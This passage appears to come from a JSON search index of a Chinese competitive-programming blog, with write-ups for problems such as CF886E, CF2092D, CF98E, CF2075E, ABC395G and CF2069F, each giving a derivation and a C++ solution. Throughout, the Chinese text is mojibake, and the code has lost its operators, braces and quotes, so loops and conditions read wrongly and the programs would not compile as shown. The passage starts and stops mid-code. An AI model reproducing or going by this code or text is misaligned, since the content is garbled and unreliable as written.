(),a[i].l = read (),a[i].r = read (); int l = 1,r = 0; while (r m) ++r; if (!a[r].ty) tr1.modify (1,1,n,a[r].l,a[r].r,1); else tr2.modify (1,1,n,a[r].r,a[r].l,0); while (l = r) if (!a[r].ty) int dl = tr1.search_R (1,1,n,1,a[r].l) + 1,dr = tr1.search_L (1,1,n,a[r].r,n) - 1; if (tr2.query (1,1,n,dl,dr) dl) break; else if (!tr1.query (1,1,n,a[r].l,a[r].r)) break; if (!a[l].ty) tr1.modify (1,1,n,a[l].l,a[l].r,-1); else tr2.modify (1,1,n,a[l].r,a[l].l,1); ++l; f[r] = l; q = read (); while (q--) int l = read (),r = read (); puts (f[r] = l ? YES : NO); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF886E Maximum Element","path":"/2025/04/18/CF886E/","content":"æ­£éš¾åˆ™åï¼Œè€ƒè™‘é•¿åº¦ä¸º $i$ çš„æ’åˆ—å¾—åˆ°æ­£ç¡®çš„ç»“æœçš„æ–¹æ¡ˆæ•°ã€‚ è®¾ $dp_i$ è¡¨ç¤ºé•¿åº¦ä¸º $i$ çš„æ’åˆ—ç›´åˆ°å¾ªç¯å®Œä¹Ÿæ²¡æœ‰æå‰ return çš„æ–¹æ¡ˆæ•°ã€‚è€ƒè™‘ $i$ æ‰€æ”¾ç½®çš„ä½ç½®ï¼Œç”±äºä¸ä¼šæå‰ returnï¼Œä¹Ÿå°±è¯´æ˜è¯¥æ•°å­—æ‰€åœ¨çš„ä½ç½®ä¸º $[i - k + 1,i]$ çš„èŒƒå›´ä¸­ã€‚å› æ­¤å¯ä»¥æšä¸¾ $i$ çš„ä½ç½®ä¸º $j$ï¼Œåˆ™ç›¸å½“äºå°† $[1,i]$ çš„åŒºé—´åˆ†ä¸º $[1,j - 1],[j],[j + 1,i]$ã€‚ ç¬¬ä¸€æ®µä¸º $i - 1$ ä¸ªæ•°å­—ä¸­é€‰æ‹© $j - 1$ ä¸ªï¼Œä¹Ÿå°±æ˜¯ $\\binom{i-1}{j-1}$ï¼Œç„¶ååˆæ³•çš„æ–¹æ¡ˆæ•°ä¸º $dp_{j - 1}$ï¼›ç¬¬äºŒæ®µæ”¾æœ€å¤§å€¼ $i$ï¼Œç¬¬ä¸‰æ®µè¿˜å‰©ä¸‹ $i - j$ ä¸ªæ•°å­—ï¼Œéšæ„æ”¾ç½®ï¼Œä¹Ÿå°±æ˜¯ $(i - j)!$ã€‚è™½ç„¶è¯´ $dp_i$ çš„çŠ¶æ€è€ƒè™‘çš„æ˜¯æ’åˆ—ï¼Œä½†æ˜¯æ˜¾ç„¶æˆ‘ä»¬åªéœ€è¦è€ƒè™‘æ•°å­—ä¹‹é—´çš„ç›¸å¯¹å¤§å°ï¼Œå› æ­¤ç¬¬ä¸€æ®µçš„æ–¹æ¡ˆæ•°æ˜¯åˆç†çš„ã€‚å¯ä»¥å¾—åˆ°ä»¥ä¸‹è½¬ç§»ï¼š dp_i=\\sum_{j=i-k+1}^i \\binom{i-1}{j-1}\\times dp_{j-1}\\times (i-j)!å°è¯•è¿›è¡ŒåŒ–ç®€ï¼Œå¯ä»¥å¾—åˆ°ï¼š dp_i = \\sum_{j=i-k+1}^i \\frac{(i - 1)!}{(j - 1)! \\times ((i - 1) - (j - 1))!}\\times dp_{j-1}\\times (i-j)! \\\\ = \\sum_{j=i-k+1}^i\\frac{(i - 1)!}{(j - 1)!} \\times dp_{j - 1} \\\\ = (i - 1)! \\times \\sum_{j=i-k}^{i - 1} \\frac{dp_j}{j!}ç»´æŠ¤ä¸€æ®µé•¿åº¦ä¸º $k$ çš„ $\\frac{dp_i}{i!}$ çš„å’Œå³å¯ $O(n)$ æ±‚å‡º $dp_i$ã€‚ æœ€åå†è€ƒè™‘ç­”æ¡ˆã€‚è‹¥æœ€åæ±‚å¾—çš„ç­”æ¡ˆæ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬åªéœ€è¦æšä¸¾ $n$ æ‰€åœ¨çš„ä½ç½®å³å¯ã€‚å› æ­¤æ€»å…±åˆæ³•çš„æ–¹æ¡ˆæ•°ä¸ºï¼š ans = \\sum_{i = 1}^n \\binom {n - 1}{i - 1} \\times dp_{i - 1} \\times (n - i)!æœ€åçš„ç­”æ¡ˆå°±æ˜¯ $n!-ans$ã€‚ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,k;ll tot,sum,dp[MAX],f[MAX],inv[MAX];ll qpow (ll x,ll y) ll res = 1; while (y) if (y 1) res = res * x % MOD; x = x * x % MOD; y = 1; return res;int main () n = read ();k = read (); inv[0] = f[0] = 1; for (int i = 1;i = n;++i) f[i] = f[i - 1] * i % MOD; inv[n] = qpow (f[n],MOD - 2); for (int i = n - 1;i;--i) inv[i] = inv[i + 1] * (i + 1) % MOD; dp[0] = sum = 1; for (int i = 1;i = n;++i) dp[i] = f[i - 1] * sum % MOD; sum = (sum + dp[i] * inv[i] % MOD) % MOD; if (i = k) sum = (sum - dp[i - k] * inv[i - k] % MOD + MOD) % MOD; for (int i = 1;i = n;++i) tot = (tot + dp[i - 1] * f[n - 1] % MOD * inv[i - 1] % MOD) % MOD; printf (%lld ,(f[n] - tot + MOD) % MOD); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2092D Mishkin Energizer","path":"/2025/04/02/CF2092D/","content":"ä¸éš¾å‘ç°å½¢å¦‚ LIT çš„ä¸²æ˜¯ä¸‡èƒ½çš„ã€‚è¯æ˜å¦‚ä¸‹ï¼š å¯ä»¥å¤šç”Ÿæˆä¸€ä¸ª L å˜ä¸º LILTã€‚ å¯ä»¥å¤šç”Ÿæˆä¸€ä¸ª T å˜ä¸º LTITã€‚ æƒ³è¦å¤šç”Ÿæˆä¸€ä¸ª Iï¼Œå…ˆé€‰æ‹©ä¸Šé¢ä¸¤ä¸ªçš„å…¶ä¸­ä¸€ä¸ªæ“ä½œï¼Œç„¶ååŒç†å³å¯ã€‚ è¿›ä¸€æ­¥åœ°ï¼Œåªè¦å­˜åœ¨ç›¸é‚»ä¸¤ä¸ªå­—æ¯ä¸åŒï¼Œå°±å¯ä»¥èŠ±è´¹ä¸€ä¸ªæ“ä½œå˜ä¸ºä¸‡èƒ½ä¸²ã€‚æ¯ä¸€æ­¥æœ€å¤šæ“ä½œä¸¤æ¬¡å³å¯å‘ç€ç›®æ ‡å‰è¿›ï¼Œæ•…æ€»æ¬¡æ•°ä¸ä¼šè¶…è¿‡ $2n$ã€‚ ç”±äºè¿˜éœ€è¦è®°å½•è·¯å¾„ï¼Œå½“ LIT å˜ä¸º ILT åï¼Œéœ€è¦æ³¨æ„ä¸‡èƒ½ä¸²æœ€å·¦ä¾§çš„ä½ç½®ä¼šå¢åŠ  $1$ã€‚ç›´æ¥ç”¨ while é…å¥—ç€ swap éœ€æ±‚çš„å†™æ³•æœ€ä¸ºç®€æ´ã€‚ #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 105;const int MOD = 1e9 + 7;inline int read ();int t,n,tot,ok,cnt[200];char s[MAX];vector int ans;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); tot = L ^ I ^ T; t = read (); while (t--) n = read ();scanf (%s,s + 1); ok = cnt[L] = cnt[I] = cnt[T] = 0; ans.clear (); for (int i = 1;i = n;++i) if (i 1 s[i] != s[i - 1]) ok = 1; ++cnt[s[i]]; if (!ok) puts (-1);continue; //æ— æ³•æ„é€ å‡ºä¸‡èƒ½ä¸²ï¼Œè‚¯å®šæ˜¯æ— è§£ if (cnt[L] == cnt[I] cnt[I] == cnt[T]) puts (0);continue;//æ— éœ€æ“ä½œå°±ç›´æ¥ç‰¹åˆ¤ for (int i = 2;i = n;++i) if (s[i] == s[i - 1]) continue;//ç”± AB - ACB æ„é€ ä¸‡èƒ½ä¸² int x = s[i - 1],z = s[i],y = tot ^ (x ^ z),p = i - 1; ans.push_back (p);++cnt[y]; while (cnt[x] != cnt[y] || cnt[x] != cnt[z] || cnt[y] != cnt[z]) if (cnt[x] cnt[z]) ans.push_back (p),++cnt[z],swap (y,z); else ans.push_back (++p),++cnt[x],swap (x,y);//ä¸‡èƒ½ä¸²æœ€å·¦ä¾§çš„ä½ç½®å³ç§» break; printf (%d ,ans.size ()); for (auto v : ans) printf (%d ,v); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF98E Help Shrek and Donkey","path":"/2025/03/26/CF98E/","content":"é¦–å…ˆï¼Œåœ¨æœ€ä¼˜ç­–ç•¥çš„æ¡ä»¶ä¸‹ï¼Œåœ¨æ²¡æœ‰å¤šä½™ä¿¡æ¯çš„æƒ…å†µæ—¶ï¼Œå…ˆæ‰‹ä¸ä¼šä¸»åŠ¨å»çŒœæµ‹ï¼Œåªä¼šä¸æ–­åœ°å°è¯•è¯¢é—®ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åˆ—å‡ºä»¥ä¸‹è¡¨æ ¼ã€‚å…¶ä¸­ï¼Œä¸Šæ–¹æ˜¯å…ˆæ‰‹ï¼Œå·¦ä¾§æ˜¯åæ‰‹ã€‚å…ˆæ‰‹è¯¢é—®ä¸€å¼ è‡ªå·±æ‰‹ä¸­æ²¡æœ‰çš„ç‰Œï¼Œç§°ä¹‹ä¸ºé—®ï¼›è¯¢é—®ä¸€å¼ è‡ªå·±æ‰‹ä¸­æœ‰çš„ç‰Œï¼Œç§°ä¹‹ä¸ºè¯ˆï¼š å…ˆåæ‰‹ é—®ï¼ˆè‡ªå·±æ²¡æœ‰çš„ç‰Œï¼‰ è¯ˆï¼ˆè‡ªå·±æœ‰çš„ç‰Œï¼‰ ç›¸ä¿¡å…ˆæ‰‹ $\\texttt{A}$ $\\texttt{B}$ ä¸ç›¸ä¿¡å…ˆæ‰‹ $\\texttt{C}$ $\\texttt{D}$ è®¾ $f_{n,m}$ è¡¨ç¤ºå…ˆæ‰‹æœ‰ $n$ å¼ ï¼Œåæ‰‹æœ‰ $m$ å¼ ç‰Œæ—¶ï¼Œå…ˆæ‰‹è·èƒœçš„æ¦‚ç‡ã€‚å¯¹å››ç§æƒ…å†µè¿›è¡Œè¯¦ç»†åœ°åˆ†æï¼š $\\texttt{Case A}$ æœ‰ $\\frac{1}{m + 1}$ çš„æ¦‚ç‡é—®åˆ°æ¡Œä¸Šçš„é‚£å¼ ç‰Œã€‚ç”±äºåæ‰‹é€‰æ‹©ç›¸ä¿¡ï¼Œåæ‰‹ä¹Ÿå°±çŸ¥æ™“äº†æ¡Œä¸Šçš„ç‰Œï¼Œå› æ­¤ä¸‹ä¸€æ¬¡å¯ä»¥ç›´æ¥çŒœæµ‹è¿™å¼ ç‰Œè€Œè·èƒœã€‚ æœ‰ $\\frac{m}{m + 1}$ çš„æ¦‚ç‡é—®åˆ°åæ‰‹æ‰‹ä¸­çš„ç‰Œã€‚åæ‰‹å¤±å»ä¸€å¼ ç‰Œä¸”æ— å¤šä½™ä¿¡æ¯è·å¾—ã€‚ å› æ­¤è¯¥ç§æƒ…å†µçš„æ”¶ç›Šä¸º $\\frac{1}{m + 1} \\times 0 + \\frac{m}{m + 1}(1-f_{m - 1,n})$ã€‚ $\\texttt{Case B}$ åæ‰‹è®¤ä¸ºè¿™å¼ ç‰Œæ˜¯æ¡Œä¸Šçš„ç‰Œï¼Œå› æ­¤åæ‰‹æ— æ³•è·èƒœï¼Œæ”¶ç›Šä¸º $1$ã€‚ $\\texttt{Case C}$ æœ‰ $\\frac{1}{m + 1}$ çš„æ¦‚ç‡é—®åˆ°æ¡Œä¸Šçš„é‚£å¼ ç‰Œã€‚ç”±äºåæ‰‹é€‰æ‹©ä¸ç›¸ä¿¡ï¼Œç›¸å½“äºåæ‰‹è®¤ä¸ºè¿™å¼ ç‰Œæ˜¯å…ˆæ‰‹çš„ï¼Œå› æ­¤å…ˆæ‰‹èƒœã€‚ æœ‰ $\\frac{m}{m + 1}$ çš„æ¦‚ç‡é—®åˆ°åæ‰‹æ‰‹ä¸­çš„ç‰Œã€‚åæ‰‹å¤±å»ä¸€å¼ ç‰Œä¸”æ— å¤šä½™ä¿¡æ¯è·å¾—ã€‚ å› æ­¤è¯¥ç§æƒ…å†µçš„æ”¶ç›Šä¸º $\\frac{1}{m + 1} \\times 1 + \\frac{m}{m + 1}(1-f_{m - 1,n}) = 1 - \\frac{m}{m + 1}f_{m - 1,n}$ã€‚ $\\texttt{Case D}$ ç›¸å½“äºåæ‰‹çŸ¥æ™“äº†å…ˆæ‰‹çš„ä¸€å¼ ç‰Œï¼Œå…ˆæ‰‹æ— å¤šä½™ä¿¡æ¯è·å¾—ï¼Œæ”¶ç›Šä¸º $1 - f_{m,n - 1}$ã€‚ å››ç§æƒ…å†µå‡å·²çŸ¥æ™“åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°çº³ä»€å‡è¡¡ï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ¦‚ç‡ $p$ ä½¿å¾—æ¯ä¸ªäººçš„é€‰æ‹©éƒ½è®©å¯¹æ–¹æ— æ³•çŒœé€ï¼Œæ›´è¿›ä¸€æ­¥æ¥è¯´ï¼Œå°±æ˜¯æœŸæœ›ä»·å€¼ç›¸ç­‰ï¼ˆå¦‚æœç”»å›¾ï¼Œå¯ä»¥å¾—åˆ°ä¸¤æ¡çº¿å­˜åœ¨éåæ ‡è½´å¤„çš„äº¤ç‚¹ï¼‰ã€‚å› æ­¤å¯åˆ—å‡ºæ–¹ç¨‹ï¼š pA + (1 - p)B = pC + (1 - p)D \\\\ p(A - B - C + D) = D - B \\\\ p = \\dfrac{B - D}{B + C - A - D}ä»£ç ç”¨è®°å¿†åŒ–å³å¯ï¼Œæ³¨æ„è¾¹ç•Œæƒ…å†µï¼š long double dfs (int x,int y) if (dp[x][y]) return dp[x][y]; if (!x) return dp[x][y] = 1.0 / (y + 1); if (!y) return dp[x][y] = 1.0; long double A = 1.0 * y / (y + 1) * (1 - dfs (y - 1,x)),B = 1.0,C = 1.0 - 1.0 * y / (y + 1) * dfs (y - 1,x),D = 1 - dfs (y,x - 1); long double p = (B - D) / (B + C - A - D); return dp[x][y] = p * A + (1 - p) * B;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2075E XOR Matrix","path":"/2025/03/20/CF2075E/","content":"æ³¨æ„åˆ°ä¸€ä¸ªæ•°ç»„å†…çš„æ•°çš„ç§ç±»ä¸å¯èƒ½å¤§äº $2$ï¼Œäºæ˜¯å¤§åŠ›åˆ†ç±»è®¨è®ºã€‚ $a,b$ æ•°ç»„å†…çš„æ•°å‡åªæœ‰ä¸€ç§ï¼Œæ­¤æ—¶ç”Ÿæˆçš„å¼‚æˆ–çŸ©é˜µåªæœ‰ä¸€ç§å–å€¼ï¼Œæ»¡è¶³é¢˜ç›®æ¡ä»¶ï¼Œæ–¹æ¡ˆæ•°ä¸º $(A + 1)(B + 1)$ã€‚ $a$ æ•°ç»„å†…çš„æ•°æœ‰ä¸¤ç§ï¼Œ$b$ ä¸­åªæœ‰ä¸€ç§ã€‚æ­¤æ—¶ç”Ÿæˆçš„å¼‚æˆ–çŸ©é˜µæœ‰ä¸¤ç§å–å€¼ï¼Œä»ç„¶æ»¡è¶³é¢˜ç›®æ¡ä»¶ã€‚å¯ä»¥ç»™ $a$ æ•°ç»„å†…çš„æ•°ä»»æ„é€‰æ‹©ä¸¤ç§ï¼Œå¹¶æšä¸¾å…¶ä¸­ä¸€ç§æ•°çš„ä¸ªæ•°ã€‚ç”¨äºŒé¡¹å¼å®šç†è¿›ä¸€æ­¥åŒ–ç®€ï¼Œæœ€ç»ˆå¯å¾—åˆ°æ–¹æ¡ˆæ•°ä¸º (B + 1) \\times \\binom {A + 1}{2} \\sum \\limits_{i = 1}^{n - 1} \\binom {n}{i} \\\\ =\\dfrac{1}{2}{(B + 1)(A + 1)A}\\sum \\limits_{i = 1}^{n - 1} \\binom {n}{i} \\\\ =\\dfrac{1}{2}{(B + 1)(A + 1)A}(2^n - 2) $b$ æ•°ç»„å†…çš„æ•°æœ‰ä¸¤ç§ï¼Œ$a$ ä¸­åªæœ‰ä¸€ç§ã€‚åŒç†å¯å¾—æ–¹æ¡ˆæ•°ä¸º \\dfrac{1}{2}{(A + 1)(B + 1)B}(2^m - 2) $a,b$ æ•°ç»„å†…çš„æ•°å‡æœ‰ä¸¤ç§ã€‚è®¾ $a$ ä¸­å­˜åœ¨ $x_1,x_2 (x_1 eq x_2)$ï¼Œ$b$ ä¸­å­˜åœ¨ $y_1,y_2 (y_1 eq y_2)$ï¼Œåˆ™åªæœ‰ $x_1 \\oplus y_2 = x_2 \\oplus y_1$ æ—¶æ»¡è¶³é¢˜æ„ã€‚äº¤æ¢ä¸€ä¸‹å¯å¾— $x_1 \\oplus x_2 = y_1 \\oplus y_2$ã€‚ç”±äºæ¯ä¸€ä½ç›¸äº’ç‹¬ç«‹ï¼Œæ‰€ä»¥è®¾ $dp_{i,0/1,0/1,0/1,0/1}$ è¡¨ç¤ºè€ƒè™‘åˆ°ç¬¬ $i$ ä½æ—¶ï¼Œ$x_1,x_2,y_1,y_2$ æ˜¯å¦å·²ç»è¾¾åˆ°ä¸Šç•Œæ—¶çš„æ–¹æ¡ˆæ•°ï¼Œç›´æ¥å¤§åŠ›æ•°ä½ dp å³å¯ã€‚éœ€è¦æ³¨æ„çš„æ—¶ï¼Œæœ€åè¿˜éœ€è¦æšä¸¾æŸä¸€ä¸ªæ•°çš„ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯ä¹˜ä¸Š \\sum \\limits_{i = 1}^{n - 1} \\binom {n}{i} \\times \\sum \\limits_{i = 1}^{m - 1} \\binom {m}{i} \\\\ = (2^n - 2)(2^m - 2)æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,-1,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e5 + 5;const int MOD = 998244353;inline int read ();int t,a[35],b[35];ll n,m,A,B,ans,inv_2 = 499122177,dp[35][2][2][2][2]; ll qpow (ll x,ll y) ll res = 1; while (y) if (y 1) res = res * x % MOD; x = x * x % MOD; y = 1; return res;int dfs (int x,bool lead,bool p1,bool p2,bool p3,bool p4) if (x = 30) return !lead;//ä¸èƒ½å‡ä¸º 0 if (~dp[x][p1][p2][p3][p4]) return dp[x][p1][p2][p3][p4]; ll sum = 0; for (int d1 = 0;d1 = (p1 ? a[x] : 1);++d1) for (int d2 = 0;d2 = (p2 ? d1 : 1);++d2) for (int d3 = 0;d3 = (p3 ? b[x] : 1);++d3) for (int d4 = 0;d4 = (p4 ? d3 : 1);++d4) if ((d1 ^ d2) == (d3 ^ d4)) sum += dfs (x + 1,lead !(d1 ^ d2),p1 (d1 == a[x]),p2 (d2 == d1),p3 (d3 == b[x]),p4 (d4 == d3)),sum %= MOD; return dp[x][p1][p2][p3][p4] = sum;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();m = read ();A = read ();B = read (); ans = (A + 1) * (B + 1) % MOD; ans += (A + 1) * (B + 1) % MOD * B % MOD * inv_2 % MOD * (qpow (2,m) - 2 + MOD) % MOD;ans %= MOD; ans += (B + 1) * (A + 1) % MOD * A % MOD * inv_2 % MOD * (qpow (2,n) - 2 + MOD);ans %= MOD; for (int i = 0;i 30;++i,A = 1) a[29 - i] = A 1; for (int i = 0;i 30;++i,B = 1) b[29 - i] = B 1; init (dp); ans += dfs (0,1,1,1,1,1) * (qpow (2,m) - 2 + MOD) % MOD * (qpow (2,n) - 2 + MOD) % MOD;ans %= MOD; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼š[ABC395G] Minimum Steiner Tree 2","path":"/2025/03/03/ABC395G/","content":"$K$ çš„æ•°æ®èŒƒå›´å¼‚å¸¸å°ï¼Œå¼•å¯¼æˆ‘ä»¬å¾€çŠ¶å‹ä¸Šæ€è€ƒã€‚ è®¾ $dp_{st,y}$ è¡¨ç¤ºå·²ç»åŒ…å« $1\\sim k$ ä»¥åŠ $x$ ï¼Œä¸ $y$ å»ºç«‹è”ç³»çš„æœ€å°èŠ±è´¹ï¼Œå…¶ä¸­ $1\\sim k$ ä»¥åŠ $x$ å¯ä»¥ç”¨ $2^{k + 1}$ ç§çŠ¶æ€æ¥è¡¨ç¤ºã€‚æšä¸¾ $st$ ä¸­åŒ…å« $x$ï¼Œå­˜åœ¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š å¯¹äºåŒä¸€ä¸ª $y$ï¼Œé€šè¿‡å­é›†æšä¸¾æ¥è½¬ç§»ï¼š dp_{st,y} = dp_{T,y} + dp_{st\\oplus T,y} å¯¹äºä¸åŒçš„ $y$ï¼Œéœ€è¦ä¸€ä¸ªä¸­é—´ç‚¹ $k$ï¼Œè¿™å°±æƒ³åˆ°å¯ä»¥é€šè¿‡æœ€çŸ­è·¯çš„æ–¹å¼è¿›è¡ŒçŠ¶æ€çš„æ›´æ–°ï¼š dp_{st,y} = dp_{st,k} + C_{k,y}æœ€åçš„æ—¶é—´å¤æ‚åº¦ä¸º $O(n^2 3^k + n^2 2^k \\log n)$ï¼Œä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f3f3f3f3f#define pii pair ll,intusing namespace std;const int MAX = 85;const int MOD = 1e9 + 7;inline int read ();int n,m,q,c[MAX][MAX],vis[MAX];ll ans[MAX][MAX],dp[1 9][MAX];//dp[st][y] å·²ç»åŒ…å« 1-kï¼ˆåŒ…å«ä¸€ä¸ª x) ï¼Œä¸ y å»ºç«‹è”ç³»çš„æœ€å°èŠ±è´¹ //dp[st][y] = dp[T][y] + dp[T ^ st][y] O(3^k)//dp[st][y] = dp[sy][k] + dis[k][y] void dijkstra (ll *dis);void solve (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 0;i n;++i) for (int j = 0;j n;++j) c[i][j] = read (); for (int i = 0;i n;++i) solve (i); q = read (); while (q--) int x = read (),y = read (); printf (%lld ,ans[--x][--y]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void solve (int x) //[st] åŒ…å« x init (dp); dp[1 m][x] = 0; for (int i = 0;i m;++i) dp[1 i][i] = 0; for (int S = 0;S (1 (m + 1));++S) for (int i = 0;i n;++i) for (int T = S (S - 1);T;T = (T - 1) S) dp[S][i] = min (dp[S][i],dp[T][i] + dp[T ^ S][i]); dijkstra (dp[S]); for (int i = 0;i n;++i) ans[x][i] = dp[(1 (m + 1)) - 1][i];void dijkstra (ll *dis) priority_queue pii q; for (int i = 0;i n;++i) q.push (-dis[i],i),vis[i] = 0; while (!q.empty ()) int u = q.top ().second;q.pop (); if (vis[u]) continue; vis[u] = 1; for (int v = 0;v n;++v) if (dis[v] dis[u] + c[u][v]) dis[v] = dis[u] + c[u][v],q.push (-dis[v],v);","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2069F Graph Inclusion","path":"/2025/02/24/CF2069F/","content":"å¯¹äºä¸€ç»„è¯¢é—®ï¼Œç­”æ¡ˆä¸º $A$ ä¸­è¿é€šå—çš„æ•°é‡ - $A \\cup B$ ä¸­çš„è¿é€šå—æ•°é‡ã€‚ è®¾åœ¨ $A$ ä¸­æ·»åŠ äº†è‹¥å¹²æ¡è¾¹åå˜ä¸º $Aâ€™$ã€‚å½“ä¸¤ä¸ªé¡¶ç‚¹ $u,v$ åœ¨ $A$ æˆ– $B$ ä¸­å±äºåŒä¸€ä¸ªè¿é€šåˆ†é‡ï¼Œé‚£ä¹ˆåœ¨ $Aâ€™$ ä¸­å¿…åŒå±äºä¸€ä¸ªè¿é€šåˆ†é‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¸éš¾å¾—å‡ºä¸Šè¿°ç»“è®ºã€‚ ç”±äºå­˜åœ¨åŠ¨æ€çš„åŠ è¾¹åˆ è¾¹ï¼Œä¸éš¾æƒ³åˆ°æ—¶é—´æˆ³çš„çº¿æ®µæ ‘åˆ†æ²»ã€‚å¯¹äºåœ¨æŸä¸€å¼ å›¾çš„è¾¹ï¼Œè®°å½•ä¸‹å‡ºç°æ—¶é—´å’Œæ¶ˆå¤±æ—¶é—´ $l,r$ï¼Œåˆ™ç”±é¢˜ç›®å¯çŸ¥ï¼Œè¯¥è¾¹åœ¨ $[l,r - 1]$ èŒƒå›´å†…äº§ç”Ÿè´¡çŒ®ã€‚æ³¨æ„ï¼Œè‹¥ä¸€æ¡è¾¹åœ¨åŠ å…¥ä¹‹åä¸€ç›´å­˜åœ¨ï¼Œåˆ™è¯¥è¾¹åœ¨ $[l,q]$ èŒƒå›´å†…äº§ç”Ÿè´¡çŒ®ã€‚ è‡³äºå¦‚ä½•è®¡ç®—è¿é€šå—çš„ä¸ªæ•°ï¼Œåˆå§‹å€¼æ˜¾ç„¶ä¸º $n$ã€‚ä¸æ­¤åŒæ—¶ï¼Œå¯ä»¥åœ¨å¹¶æŸ¥é›†çš„åˆå¹¶æ—¶å¢åŠ ä¸€ä¸ªè¿”å›å€¼ï¼Œè‹¥å½¢æˆä¸€æ¬¡æœ‰æ•ˆçš„åˆå¹¶æ—¶ï¼Œè¿é€šå—çš„ä¸ªæ•°ä¾¿ä¼šå‡å°‘ $1$ã€‚ ç”±äºéœ€è¦åˆ†åˆ«ç»´æŠ¤ $A$ å’Œ $A \\cup B$ çš„è¿é€šå—æ•°é‡ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ±‚è§£å‡º $A$ï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸ŠåŠ å…¥ $B$ çš„è¾¹å³å¯å¾—åˆ° $A \\cup B$ çš„ç­”æ¡ˆã€‚ ç”±äºå¹¶æŸ¥é›†ä¸èƒ½è·¯å¾„å‹ç¼©ï¼Œæœ€åæ—¶é—´å¤æ‚åº¦ä¸º $O(q \\log q \\log n)$ï¼Œä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,int using namespace std;const int MAX = 4e5 + 5;const int MOD = 1e9 + 7;inline int read ();pii st[MAX],e[MAX]; vector pii ve[MAX 2];map pii,int mp;int n,q,top,ans[3][MAX],fa[MAX],sz[MAX];char ty[MAX][1];int getfa (int u);bool merge (int u,int v);void modify (int cur,int l,int r,int x,int y,pii v);void solve (int res[],int cur,int l,int r,int tot);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();q = read (); for (int i = 1;i = n;++i) fa[i] = i,sz[i] = 1; for (int i = 1;i = q;++i) scanf (%s,ty[i]);int u = read (),v = read (); if (u v) swap (u,v); e[i] = u,v; for (int i = 1;i = q;++i) if (ty[i][0] == B) continue; if (!mp[e[i]]) mp[e[i]] = i; else modify (1,1,q,mp[e[i]],i - 1,e[i]); mp[e[i]] = 0; for (auto item : mp) if (item.second) modify (1,1,q,item.second,q,item.first); solve (ans[1],1,1,q,n); mp.clear (); for (int i = 1;i = q;++i) if (ty[i][0] == A) continue; if (!mp[e[i]]) mp[e[i]] = i; else modify (1,1,q,mp[e[i]],i - 1,e[i]); mp[e[i]] = 0; for (auto item : mp) if (item.second) modify (1,1,q,item.second,q,item.first); solve (ans[2],1,1,q,n); for (int i = 1;i = q;++i) printf (\\t%d ,ans[1][i] - ans[2][i]);//A - A U B return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int getfa (int u) return fa[u] == u ? u : getfa (fa[u]); bool merge (int u,int v) u = getfa (u),v = getfa (v); if (u == v) return 0; if (sz[u] sz[v]) swap (u,v); st[++top] = u,v;// u - v fa[u] = v;sz[v] += sz[u]; return 1;void modify (int cur,int l,int r,int x,int y,pii v) if (x = l y = r) ve[cur].push_back (v);return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,y,v); if (y mid) modify (cur 1 | 1,mid + 1,r,x,y,v); void solve (int res[],int cur,int l,int r,int tot) int la = top; for (auto p : ve[cur]) tot -= merge (p.first,p.second); if (l == r) res[l] = 